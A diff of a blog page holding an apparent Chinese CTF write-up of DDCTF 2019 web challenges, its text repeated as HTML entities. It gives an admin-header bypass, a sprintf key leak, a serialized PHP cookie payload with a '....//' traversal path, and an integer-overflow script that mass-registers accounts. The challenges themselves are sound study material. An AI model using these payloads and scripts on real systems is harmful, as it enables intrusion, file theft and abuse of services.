+<p>&#x53D8;&#x91CF;&#x8986;&#x76D6;&#xFF0C;&#x5224;&#x65AD;&#x53D8;&#x91CF;uid&#x548C;&#x6587;&#x4EF6;&#x540D;&#x4E3A;&#x53D8;&#x91CF;k&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x662F;&#x5426;&#x76F8;&#x540C;&#x3002;</p>
+<p>&#x4E00;&#x5F00;&#x59CB;&#x60F3;&#x7740;&#x5E94;&#x8BE5;&#x662F;&#x5F31;&#x7C7B;&#x578B;&#xFF0C;&#x4F46;&#x540E;&#x6765;&#x53D1;&#x73B0;&#x4E0D;&#x662F;&#x3002;</p>
+<p>&#x5982;&#x679C;&#x6587;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x8BDD;&#xFF0C;&#x8BFB;&#x53D6;&#x5230;&#x7684;&#x5185;&#x5BB9;&#x5C31;&#x4E3A;&#x7A7A;&#xFF0C;&#x6240;&#x4EE5;uid&#x8D4B;&#x503C;&#x4E3A;&#x7A7A;&#xFF0C;k&#x4E3A;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x8BBF;&#x95EE;&#xFF1A;</p>
 <p><code>http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=333</code></p>
-<p>得到Flag。</p>
-<p>(因为网站存在robots.txt，内容为<code>excuse me?</code>， 我尝试访问：<code>http://117.51.150.246/f1ag!ddctf.php?uid=excuse%20me?&amp;k=robots.txt</code> 不知道为什么不成功)</p>
-<h2 id="Web-WEB签到题"><a href="#Web-WEB签到题" class="headerlink" title="Web - WEB签到题"></a>Web - WEB签到题</h2><p>题目地址：<a href="http://117.51.158.44/" target="_blank" rel="noopener">http://117.51.158.44/</a></p>
-<p>网页提示：<code>抱歉，您没有登陆权限，请获取权限后访问-----</code></p>
-<p>发现，弹出<code>需要授权</code>，他提示该网站称：<code>restricted username</code></p>
-<p>尝试了几个弱口令，不行。</p>
-<p>在index.php页面的源码中发现了一个js：<code>http://117.51.158.44/js/index.js</code></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: didi</span></span><br><span class="line"><span class="comment"> * Date: 2019/1/13</span></span><br><span class="line"><span class="comment"> * Time: 9:05 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"post"</span>,</span><br><span class="line">        url:<span class="string">"http://117.51.158.44/app/Auth.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/json;charset=utf-8"</span>,</span><br><span class="line">        dataType: <span class="string">"json"</span>,</span><br><span class="line">        beforeSend: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) </span>&#123;</span><br><span class="line">            XMLHttpRequest.setRequestHeader(<span class="string">"didictf_username"</span>, <span class="string">""</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">getdata</span>) </span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.log(getdata);</span><br><span class="line">           <span class="keyword">if</span>(getdata.data !== <span class="string">''</span>) &#123;</span><br><span class="line">               <span class="built_in">document</span>.getElementById(<span class="string">'auth'</span>).innerHTML = getdata.data;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,<span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>给<code>http://117.51.158.44/app/Auth.php</code>发了一个POST请求，并且http头包含<code>didictf_username</code></p>
-<p>用Brupsuite包含<code>Didictf_Username: admin</code>像Auth.php提交一个POST请求,返回：</p>
-<p><code>{errMsg:success,data:您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php}</code></p>
-<p>访问<code>http://117.51.158.44/app/fL2XID2i0Cdh.php</code>得到两份PHP代码，看来是又要审计？</p>
-<p>将源码理了一下，之后搜索到了<a href="https://juejin.im/post/5aa1154d6fb9a028de4448d2" target="_blank" rel="noopener">Codeigniter 利用加密Key（密钥）的对象注入漏洞</a></p>
-<p>读完文章之后的思路就是：</p>
+<p>&#x5F97;&#x5230;Flag&#x3002;</p>
+<p>(&#x56E0;&#x4E3A;&#x7F51;&#x7AD9;&#x5B58;&#x5728;robots.txt&#xFF0C;&#x5185;&#x5BB9;&#x4E3A;<code>excuse me?</code>&#xFF0C; &#x6211;&#x5C1D;&#x8BD5;&#x8BBF;&#x95EE;&#xFF1A;<code>http://117.51.150.246/f1ag!ddctf.php?uid=excuse%20me?&amp;k=robots.txt</code> &#x4E0D;&#x77E5;&#x9053;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x6210;&#x529F;)</p>
+<h2 id="Web-WEB&#x7B7E;&#x5230;&#x9898;"><a href="#Web-WEB&#x7B7E;&#x5230;&#x9898;" class="headerlink" title="Web - WEB&#x7B7E;&#x5230;&#x9898;"></a>Web - WEB&#x7B7E;&#x5230;&#x9898;</h2><p>&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF1A;<a href="http://117.51.158.44/" target="_blank" rel="noopener">http://117.51.158.44/</a></p>
+<p>&#x7F51;&#x9875;&#x63D0;&#x793A;&#xFF1A;<code>&#x62B1;&#x6B49;&#xFF0C;&#x60A8;&#x6CA1;&#x6709;&#x767B;&#x9646;&#x6743;&#x9650;&#xFF0C;&#x8BF7;&#x83B7;&#x53D6;&#x6743;&#x9650;&#x540E;&#x8BBF;&#x95EE;-----</code></p>
+<p>&#x53D1;&#x73B0;&#xFF0C;&#x5F39;&#x51FA;<code>&#x9700;&#x8981;&#x6388;&#x6743;</code>&#xFF0C;&#x4ED6;&#x63D0;&#x793A;&#x8BE5;&#x7F51;&#x7AD9;&#x79F0;&#xFF1A;<code>restricted username</code></p>
+<p>&#x5C1D;&#x8BD5;&#x4E86;&#x51E0;&#x4E2A;&#x5F31;&#x53E3;&#x4EE4;&#xFF0C;&#x4E0D;&#x884C;&#x3002;</p>
+<p>&#x5728;index.php&#x9875;&#x9762;&#x7684;&#x6E90;&#x7801;&#x4E2D;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;js&#xFF1A;<code>http://117.51.158.44/js/index.js</code></p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="hljs-comment"> * User: didi</span></span><br><span class="line"><span class="hljs-comment"> * Date: 2019/1/13</span></span><br><span class="line"><span class="hljs-comment"> * Time: 9:05 PM</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">auth</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">    $.ajax({</span><br><span class="line">        type: <span class="hljs-string">&quot;post&quot;</span>,</span><br><span class="line">        url:<span class="hljs-string">&quot;http://117.51.158.44/app/Auth.php&quot;</span>,</span><br><span class="line">        contentType: <span class="hljs-string">&quot;application/json;charset=utf-8&quot;</span>,</span><br><span class="line">        dataType: <span class="hljs-string">&quot;json&quot;</span>,</span><br><span class="line">        beforeSend: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">XMLHttpRequest</span>) </span>{</span><br><span class="line">            XMLHttpRequest.setRequestHeader(<span class="hljs-string">&quot;didictf_username&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);</span><br><span class="line">        },</span><br><span class="line">        success: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">getdata</span>) </span>{</span><br><span class="line">           <span class="hljs-built_in">console</span>.log(getdata);</span><br><span class="line">           <span class="hljs-keyword">if</span>(getdata.data !== <span class="hljs-string">&apos;&apos;</span>) {</span><br><span class="line">               <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;auth&apos;</span>).innerHTML = getdata.data;</span><br><span class="line">           }</span><br><span class="line">        },<span class="hljs-attr">error</span>:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>)</span>{</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(error);</span><br><span class="line">        }</span><br><span class="line">    });</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x7ED9;<code>http://117.51.158.44/app/Auth.php</code>&#x53D1;&#x4E86;&#x4E00;&#x4E2A;POST&#x8BF7;&#x6C42;&#xFF0C;&#x5E76;&#x4E14;http&#x5934;&#x5305;&#x542B;<code>didictf_username</code></p>
+<p>&#x7528;Brupsuite&#x5305;&#x542B;<code>Didictf_Username: admin</code>&#x50CF;Auth.php&#x63D0;&#x4EA4;&#x4E00;&#x4E2A;POST&#x8BF7;&#x6C42;,&#x8FD4;&#x56DE;&#xFF1A;</p>
+<p><code>{errMsg:success,data:&#x60A8;&#x5F53;&#x524D;&#x5F53;&#x524D;&#x6743;&#x9650;&#x4E3A;&#x7BA1;&#x7406;&#x5458;----&#x8BF7;&#x8BBF;&#x95EE;:app/fL2XID2i0Cdh.php}</code></p>
+<p>&#x8BBF;&#x95EE;<code>http://117.51.158.44/app/fL2XID2i0Cdh.php</code>&#x5F97;&#x5230;&#x4E24;&#x4EFD;PHP&#x4EE3;&#x7801;&#xFF0C;&#x770B;&#x6765;&#x662F;&#x53C8;&#x8981;&#x5BA1;&#x8BA1;&#xFF1F;</p>
+<p>&#x5C06;&#x6E90;&#x7801;&#x7406;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x4E4B;&#x540E;&#x641C;&#x7D22;&#x5230;&#x4E86;<a href="https://juejin.im/post/5aa1154d6fb9a028de4448d2" target="_blank" rel="noopener">Codeigniter &#x5229;&#x7528;&#x52A0;&#x5BC6;Key&#xFF08;&#x5BC6;&#x94A5;&#xFF09;&#x7684;&#x5BF9;&#x8C61;&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;</a></p>
+<p>&#x8BFB;&#x5B8C;&#x6587;&#x7AE0;&#x4E4B;&#x540E;&#x7684;&#x601D;&#x8DEF;&#x5C31;&#x662F;&#xFF1A;</p>
 <ol>
-<li>拿到eancrykey</li>
-<li>通过反序列化修改<code>$this-&gt;path</code></li>
-<li>读取flag</li>
+<li>&#x62FF;&#x5230;eancrykey</li>
+<li>&#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4FEE;&#x6539;<code>$this-&gt;path</code></li>
+<li>&#x8BFB;&#x53D6;flag</li>
 </ol>
-<p>源码中可以看到eancrykey是通过读取<code>../config/key.txt</code>得到的，后面存在一个判断：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">    $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">    $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        $data = sprintf($data,$v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里使用POST提交<code>nickname=123 %s</code>.(需要将添加cookie值)</p>
-<p>因为这里$data变量经过了两次sprintf处理，只有在值里面添加s%，才能把eancrykey读出来。</p>
-<p>eancrykey的值为：<code>EzblrbNS</code>, 当时的截图：</p>
+<p>&#x6E90;&#x7801;&#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x5230;eancrykey&#x662F;&#x901A;&#x8FC7;&#x8BFB;&#x53D6;<code>../config/key.txt</code>&#x5F97;&#x5230;&#x7684;&#xFF0C;&#x540E;&#x9762;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#xFF1A;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_POST[<span class="hljs-string">&quot;nickname&quot;</span>])) {</span><br><span class="line">    $arr = <span class="hljs-keyword">array</span>($_POST[<span class="hljs-string">&quot;nickname&quot;</span>],<span class="hljs-keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">    $data = <span class="hljs-string">&quot;Welcome my friend %s&quot;</span>;</span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($arr <span class="hljs-keyword">as</span> $k =&gt; $v) {</span><br><span class="line">        $data = sprintf($data,$v);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">parent</span>::response($data,<span class="hljs-string">&quot;Welcome&quot;</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;POST&#x63D0;&#x4EA4;<code>nickname=123 %s</code>.(&#x9700;&#x8981;&#x5C06;&#x6DFB;&#x52A0;cookie&#x503C;)</p>
+<p>&#x56E0;&#x4E3A;&#x8FD9;&#x91CC;$data&#x53D8;&#x91CF;&#x7ECF;&#x8FC7;&#x4E86;&#x4E24;&#x6B21;sprintf&#x5904;&#x7406;&#xFF0C;&#x53EA;&#x6709;&#x5728;&#x503C;&#x91CC;&#x9762;&#x6DFB;&#x52A0;s%&#xFF0C;&#x624D;&#x80FD;&#x628A;eancrykey&#x8BFB;&#x51FA;&#x6765;&#x3002;</p>
+<p>eancrykey&#x7684;&#x503C;&#x4E3A;&#xFF1A;<code>EzblrbNS</code>, &#x5F53;&#x65F6;&#x7684;&#x622A;&#x56FE;&#xFF1A;</p>
 <p><img src="https://i.loli.net/2019/04/19/5cb9c9ab5c898.jpg" alt="eancrykey"></p>
-<p>根据文章里面的方法，构造反序列化的payload，源码为：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;path = <span class="string">"....//config/flag.txt"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$session = serialize(<span class="keyword">new</span> Application);</span><br><span class="line"><span class="keyword">echo</span> $session;</span><br><span class="line"></span><br><span class="line">$private_key = <span class="string">'EzblrbNS'</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($private_key.$session);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>生成的payload为：<code>O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;....//config/flag.txt&quot;;}77cd55a8d29df4f005f85e536d876525</code> (记得将payload url编码)</p>
-<p>flag的地址是因为源码中的提示：<code>eancrykey  and flag under the folder</code>, 又因为$path会经过处理，会将”../“删除，所以双写”../“。最后发现path的长度刚刚18。</p>
-<p>将cookie值改为payload，就可以读取到flag。</p>
-<h2 id="Web-Upload-IMG"><a href="#Web-Upload-IMG" class="headerlink" title="Web - Upload-IMG"></a>Web - Upload-IMG</h2><p>这里考了一个没有接触过的点，二次渲染。</p>
-<p>这里上传的是一个JPG文件，先把jpg上传然后保存下来。</p>
-<p>使用脚本直接跑一下JPG图片，再次上传得到Flag。</p>
-<p>脚本来自：<a href="https://paper.tuisec.win/detail/39553671bf72998" target="_blank" rel="noopener">https://paper.tuisec.win/detail/39553671bf72998</a></p>
-<p>生成payload_jpg:</p>
+<p>&#x6839;&#x636E;&#x6587;&#x7AE0;&#x91CC;&#x9762;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x6784;&#x9020;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;payload&#xFF0C;&#x6E90;&#x7801;&#x4E3A;&#xFF1A;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Application</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;path = <span class="hljs-string">&quot;....//config/flag.txt&quot;</span>;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$session = serialize(<span class="hljs-keyword">new</span> Application);</span><br><span class="line"><span class="hljs-keyword">echo</span> $session;</span><br><span class="line"></span><br><span class="line">$private_key = <span class="hljs-string">&apos;EzblrbNS&apos;</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> md5($private_key.$session);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x751F;&#x6210;&#x7684;payload&#x4E3A;&#xFF1A;<code>O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;....//config/flag.txt&quot;;}77cd55a8d29df4f005f85e536d876525</code> (&#x8BB0;&#x5F97;&#x5C06;payload url&#x7F16;&#x7801;)</p>
+<p>flag&#x7684;&#x5730;&#x5740;&#x662F;&#x56E0;&#x4E3A;&#x6E90;&#x7801;&#x4E2D;&#x7684;&#x63D0;&#x793A;&#xFF1A;<code>eancrykey  and flag under the folder</code>, &#x53C8;&#x56E0;&#x4E3A;$path&#x4F1A;&#x7ECF;&#x8FC7;&#x5904;&#x7406;&#xFF0C;&#x4F1A;&#x5C06;&#x201D;../&#x201C;&#x5220;&#x9664;&#xFF0C;&#x6240;&#x4EE5;&#x53CC;&#x5199;&#x201D;../&#x201C;&#x3002;&#x6700;&#x540E;&#x53D1;&#x73B0;path&#x7684;&#x957F;&#x5EA6;&#x521A;&#x521A;18&#x3002;</p>
+<p>&#x5C06;cookie&#x503C;&#x6539;&#x4E3A;payload&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;&#x5230;flag&#x3002;</p>
+<h2 id="Web-Upload-IMG"><a href="#Web-Upload-IMG" class="headerlink" title="Web - Upload-IMG"></a>Web - Upload-IMG</h2><p>&#x8FD9;&#x91CC;&#x8003;&#x4E86;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;&#x63A5;&#x89E6;&#x8FC7;&#x7684;&#x70B9;&#xFF0C;&#x4E8C;&#x6B21;&#x6E32;&#x67D3;&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x4E0A;&#x4F20;&#x7684;&#x662F;&#x4E00;&#x4E2A;JPG&#x6587;&#x4EF6;&#xFF0C;&#x5148;&#x628A;jpg&#x4E0A;&#x4F20;&#x7136;&#x540E;&#x4FDD;&#x5B58;&#x4E0B;&#x6765;&#x3002;</p>
+<p>&#x4F7F;&#x7528;&#x811A;&#x672C;&#x76F4;&#x63A5;&#x8DD1;&#x4E00;&#x4E0B;JPG&#x56FE;&#x7247;&#xFF0C;&#x518D;&#x6B21;&#x4E0A;&#x4F20;&#x5F97;&#x5230;Flag&#x3002;</p>
+<p>&#x811A;&#x672C;&#x6765;&#x81EA;&#xFF1A;<a href="https://paper.tuisec.win/detail/39553671bf72998" target="_blank" rel="noopener">https://paper.tuisec.win/detail/39553671bf72998</a></p>
+<p>&#x751F;&#x6210;payload_jpg:</p>
 <p><img src="https://i.loli.net/2019/04/19/5cb9c9ab5c898.jpg" alt="xuanran"></p>
-<p>得到Flag：</p>
+<p>&#x5F97;&#x5230;Flag&#xFF1A;</p>
 <p><img src="https://i.loli.net/2019/04/19/5cb9c9ab02154.jpg" alt="xuanran"></p>
-<h2 id="Web-复现-大吉大利-今晚吃鸡"><a href="#Web-复现-大吉大利-今晚吃鸡" class="headerlink" title="Web - 复现 - 大吉大利,今晚吃鸡~"></a>Web - 复现 - 大吉大利,今晚吃鸡~</h2><p>题目提示：注册用户登陆系统并购买入场票据,淘汰所有对手就能吃鸡啦~</p>
-<p>发现只有100元，但买票需要2000元。</p>
-<p>我当时尝试过修改价钱，没绕过去，看了wp之后才知道是用整数溢出来绕过。</p>
-<p>购买链接为：<code>/ctf/api/buy_ticket?ticket_price=2000</code></p>
-<p>将ticket_price修改为：4294967297 (在32位系统下，所有无符号整数的数量是2^32=4294967296)</p>
-<p>提交，然后支付，购买成功并且只花了一元钱。</p>
-<p>在游戏里面提示：通过提交正确id与ticket来移除对手</p>
-<p>这里需要写一个脚本，批量注册，购买入场票，获得ID和ticket。然后用这个账户来移除。</p>
-<p>这里借用一个大佬的脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">X = requests.Session()</span><br><span class="line">X.get(<span class="string">"http://117.51.147.155:5050/ctf/api/register?name=admintest4&amp;password=admintest"</span>)</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="comment"># time.sleep(0.1)</span></span><br><span class="line">    R = requests.Session()</span><br><span class="line">    <span class="comment"># reg</span></span><br><span class="line">    reg_res = R.get(<span class="string">"http://117.51.147.155:5050/ctf/api/register?name=Sndav0&#123;&#125;&amp;password=12345678"</span>.format(i))</span><br><span class="line">    <span class="comment"># if "200" in reg_res.text:</span></span><br><span class="line">    <span class="comment">#     # print("Sndav&#123;&#125; is registed pass:12345678".format(i));</span></span><br><span class="line">    buy_res = R.get(<span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967299"</span>)    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bill_id = json.loads(buy_res.text)</span><br><span class="line">        bill_id = bill_id[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line">        <span class="comment"># print("billid:"+bill_id);</span></span><br><span class="line">        buy2_res = R.get(<span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&#123;&#125;"</span>.format(bill_id))</span><br><span class="line">        <span class="comment"># print(json.loads(buy2_res.text)[u'code'])</span></span><br><span class="line">        <span class="comment"># get_token</span></span><br><span class="line">        token_res = R.get(<span class="string">"http://117.51.147.155:5050/ctf/api/search_ticket"</span>)</span><br><span class="line">        js = json.loads(token_res.text)[<span class="string">'data'</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># print(js)</span></span><br><span class="line">        id = js[<span class="string">'id'</span>]</span><br><span class="line">        ticket = js[<span class="string">'ticket'</span>]</span><br><span class="line">        print(id,ticket)</span><br><span class="line">        X.get(<span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?id=&#123;&#125;&amp;ticket=&#123;&#125;"</span>.format(id,ticket))</span><br><span class="line">        print(X.get(<span class="string">"http://117.51.147.155:5050/ctf/api/get_flag"</span>).text)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-<p>直接跑，返回：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">141 c8f034432be513ace9e8452f8af78d89</span><br><span class="line">&#123;&quot;code&quot;:200,&quot;data&quot;:[&quot;DDCTF&#123;chiken_dinner_hyMCX[n47Fx)&#125;&quot;],&quot;msg&quot;:&quot;\u5927\u5409\u5927\u5229\uff0c\u4eca\u665a\u5403\u9e21&quot;&#125;</span><br></pre></td></tr></table></figure>
-<p>这题的收获应该是了解了整数溢出，后面也可以总结一下。</p>
+<h2 id="Web-&#x590D;&#x73B0;-&#x5927;&#x5409;&#x5927;&#x5229;-&#x4ECA;&#x665A;&#x5403;&#x9E21;"><a href="#Web-&#x590D;&#x73B0;-&#x5927;&#x5409;&#x5927;&#x5229;-&#x4ECA;&#x665A;&#x5403;&#x9E21;" class="headerlink" title="Web - &#x590D;&#x73B0; - &#x5927;&#x5409;&#x5927;&#x5229;,&#x4ECA;&#x665A;&#x5403;&#x9E21;~"></a>Web - &#x590D;&#x73B0; - &#x5927;&#x5409;&#x5927;&#x5229;,&#x4ECA;&#x665A;&#x5403;&#x9E21;~</h2><p>&#x9898;&#x76EE;&#x63D0;&#x793A;&#xFF1A;&#x6CE8;&#x518C;&#x7528;&#x6237;&#x767B;&#x9646;&#x7CFB;&#x7EDF;&#x5E76;&#x8D2D;&#x4E70;&#x5165;&#x573A;&#x7968;&#x636E;,&#x6DD8;&#x6C70;&#x6240;&#x6709;&#x5BF9;&#x624B;&#x5C31;&#x80FD;&#x5403;&#x9E21;&#x5566;~</p>
+<p>&#x53D1;&#x73B0;&#x53EA;&#x6709;100&#x5143;&#xFF0C;&#x4F46;&#x4E70;&#x7968;&#x9700;&#x8981;2000&#x5143;&#x3002;</p>
+<p>&#x6211;&#x5F53;&#x65F6;&#x5C1D;&#x8BD5;&#x8FC7;&#x4FEE;&#x6539;&#x4EF7;&#x94B1;&#xFF0C;&#x6CA1;&#x7ED5;&#x8FC7;&#x53BB;&#xFF0C;&#x770B;&#x4E86;wp&#x4E4B;&#x540E;&#x624D;&#x77E5;&#x9053;&#x662F;&#x7528;&#x6574;&#x6570;&#x6EA2;&#x51FA;&#x6765;&#x7ED5;&#x8FC7;&#x3002;</p>
+<p>&#x8D2D;&#x4E70;&#x94FE;&#x63A5;&#x4E3A;&#xFF1A;<code>/ctf/api/buy_ticket?ticket_price=2000</code></p>
+<p>&#x5C06;ticket_price&#x4FEE;&#x6539;&#x4E3A;&#xFF1A;4294967297 (&#x5728;32&#x4F4D;&#x7CFB;&#x7EDF;&#x4E0B;&#xFF0C;&#x6240;&#x6709;&#x65E0;&#x7B26;&#x53F7;&#x6574;&#x6570;&#x7684;&#x6570;&#x91CF;&#x662F;2^32=4294967296)</p>
